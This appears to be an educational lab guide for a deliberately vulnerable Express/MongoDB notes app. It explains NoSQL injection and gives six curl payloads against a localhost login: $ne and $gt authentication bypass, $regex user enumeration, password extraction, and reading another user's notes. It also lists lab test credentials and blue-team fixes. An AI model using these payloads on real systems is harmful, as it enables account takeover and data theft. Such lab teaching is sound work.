# NoSQL Injection Attack Guide
## For Educational & Study Purposes ONLY

---

## What is NoSQL Injection?

NoSQL Injection occurs when user input is passed directly to MongoDB queries
without sanitization. Unlike SQL injection which uses string-based query
manipulation, NoSQL injection exploits **MongoDB query operators** (`$gt`, `$ne`,
`$regex`, etc.) by sending JSON objects instead of plain strings.

---

## Vulnerability Location

**File:** `backend/routes/auth.js` — Login endpoint

```javascript
// VULNERABLE CODE — user input goes directly into the query
const user = await User.findOne({
    username: username,   // ← attacker controls this
    password: password    // ← attacker controls this
});
```

When Express parses `{"password": {"$ne": ""}}`, the `password` variable becomes
a MongoDB operator object, NOT a string. The query becomes:

```javascript
User.findOne({ username: "admin", password: { $ne: "" } })
// Translates to: "find user where username=admin AND password is NOT empty"
// This matches the admin user regardless of what the actual password is!
```

---

## How an Attacker Discovers the API Routes

You do NOT need access to the backend source code. The routes are exposed in the frontend:

1. **View Page Source** — Right-click on the login page → "View Page Source" → search for `fetch` or `/api/`
2. **Browser DevTools** — Press `F12` → **Network tab** → try to login → see the request goes to `POST /api/auth/login`
3. **HTML form action** — The login form has `action="/api/auth/login"` right in the HTML

The frontend source code reveals all endpoints:
- `POST /api/auth/login` — found in `login.html`
- `POST /api/auth/signup` — found in `signup.html`  
- `GET /api/notes` — found in `home.html`
- `POST /api/notes` — found in `home.html`
- `PUT /api/notes/:id` — found in `home.html`
- `DELETE /api/notes/:id` — found in `home.html`

---

## 3 Ways to Perform the Attacks

### Method 1: Frontend Attack Panel
Open http://localhost:3000/attack.html — a dedicated page with clickable buttons for each attack.

### Method 2: Postman
1. Open Postman → Import → select `NoSQL_Injection_Attacks.postman_collection.json` from the project root
2. Each attack is a separate request — just click **Send**
3. Tokens are auto-saved between requests so Attack 6 (steal notes) works after any login attack

### Method 3: Terminal (curl)

## Attack Payloads (run from terminal with curl)

### Attack 1: Bypass Password with `$ne` (Not Equal)
Login as `admin` without knowing the password:
```
curl -s http://localhost:3000/api/auth/login ^
  -H "Content-Type: application/json" ^
  -d "{\"username\":\"admin\",\"password\":{\"$ne\":\"\"}}"
```
**How it works:** `{$ne: ""}` means "not equal to empty string" — matches ANY password.

---

### Attack 2: Login as First User with `$gt` (Greater Than)
Login without knowing ANY credentials:
```
curl -s http://localhost:3000/api/auth/login ^
  -H "Content-Type: application/json" ^
  -d "{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}"
```
**How it works:** `{$gt: ""}` means "greater than empty string" — matches all non-empty values. Returns the first user found.

---

### Attack 3: Enumerate Users with `$regex`
Find users whose username starts with "s":
```
curl -s http://localhost:3000/api/auth/login ^
  -H "Content-Type: application/json" ^
  -d "{\"username\":{\"$regex\":\"^s\"},\"password\":{\"$gt\":\"\"}}"
```
**How it works:** `{$regex: "^s"}` matches usernames starting with "s". An attacker can iterate through the alphabet to discover all usernames.

---

### Attack 4: Extract Password Character-by-Character
Guess password one character at a time using regex:
```
curl -s http://localhost:3000/api/auth/login ^
  -H "Content-Type: application/json" ^
  -d "{\"username\":\"admin\",\"password\":{\"$regex\":\"^a\"}}"
```
Then try `^ad`, `^adm`, `^admi`, `^admin` ... until login succeeds,
revealing the full password is `admin123`.

**How it works:** `{$regex: "^a"}` checks if the password starts with "a". By iterating characters, the full password can be extracted.

---

### Attack 5: Login as ANY Specific User
Target `student2` without their password:
```
curl -s http://localhost:3000/api/auth/login ^
  -H "Content-Type: application/json" ^
  -d "{\"username\":\"student2\",\"password\":{\"$ne\":\"wrongpassword\"}}"
```
**How it works:** Matches `student2` where password is not "wrongpassword" (which is true for any real password).

---

### Attack 6: Access Stolen User's Notes
After any successful injection login, use the returned token to access private notes:
```
curl -s http://localhost:3000/api/notes ^
  -H "Authorization: Bearer <TOKEN_FROM_INJECTION>"
```

---

## Summary of MongoDB Operators Used in Attacks

| Operator  | Meaning                | Attack Use                          |
|-----------|------------------------|-------------------------------------|
| `$ne`     | Not equal              | Bypass password (match any value)   |
| `$gt`     | Greater than           | Match any non-empty string          |
| `$gte`    | Greater than or equal  | Same as $gt for strings             |
| `$lt`     | Less than              | Match values below a threshold      |
| `$regex`  | Regular expression     | Enumerate users, extract passwords  |
| `$in`     | In array               | Match against a list of values      |
| `$exists` | Field exists           | Check if field is present           |

---

## How to Fix (Blue Team)

These defenses would prevent all attacks above:

1. **Input Type Checking** — Reject non-string values:
   ```javascript
   if (typeof username !== 'string' || typeof password !== 'string') {
       return res.status(400).json({ message: 'Invalid input' });
   }
   ```

2. **Use `mongo-sanitize`** — Strip `$` operators from input:
   ```javascript
   const sanitize = require('mongo-sanitize');
   const cleanUsername = sanitize(username);
   const cleanPassword = sanitize(password);
   ```

3. **Hash Passwords with bcrypt** — Even if injection works, `$gt`/`$regex` won't match hashed values.

4. **Use `express-mongo-sanitize` middleware** — Automatically sanitize all req.body/query/params.

---

## Test Accounts

| Username  | Password    |
|-----------|-------------|
| admin     | admin123    |
| student1  | pass1234    |
| student2  | mypassword  |
| demo      | demo123     |
| testuser  | test1234    |

